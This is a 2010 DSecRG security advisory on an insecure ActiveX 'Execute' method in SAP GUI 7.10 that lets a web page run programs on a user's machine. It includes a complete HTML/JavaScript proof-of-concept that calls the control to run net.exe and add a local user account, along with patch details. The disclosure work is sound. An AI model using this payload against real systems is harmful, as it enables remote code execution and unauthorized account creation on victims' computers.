@@ -1,0 +1,66 @@
+Security vulnerability found in SAP GUI 7.10 and BI 7.0 that allows operating system functions to be called remotely.
+
+Application: SAP GUI
+Versions Affected: SAP GUI (SAP GUI 7.1)
+Vendor URL: http://SAP.com
+Bugs: Insecure method. Code Execution.
+Exploits: YES
+Reported: 16.10.2009
+Vendor response: 27.10.2009
+Date of Public Advisory: 23.03.2010
+Author: Alexey Sintsov from DSecRG
+
+Description
+***********
+
+Insecure method was founded in SAPBExCommonResources (class BExGlobal) activeX control component which is a part of SAP GUI.
+One of the methods (Execute) can be used to execute files on users system.
+
+
+
+Details
+*******
+
+Attacker can construct html page which call vulnerable function "Execute" from ActiveX Object BExGlobal.
+
+
+
+Example (add user 'don_huan' with password 'p4ssW0rd'):
+*******
+
+
+<html>
+<title>*DSecRG* Add user *DSecRG*</title>
+<object classid="clsid:A009C90D-814B-11D3-BA3E-080009D22344" id='DH'></object>
+
+<script language='Javascript'>
+function init()
+{
+DH.Execute("net.exe","user don_huan p4ssW0rd /add","d:\\windows\\",1,"",1);
+
+}
+init();
+</script>
+DSecRG
+</html>
+
+
+
+Fix Information
+***************
+All patches are available since December via note 1407285
+
+
+References
+**********
+
+http://dsecrg.com/pages/vul/show.php?id=164
+https://service.sap.com/sap/support/notes/1407285.
+
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
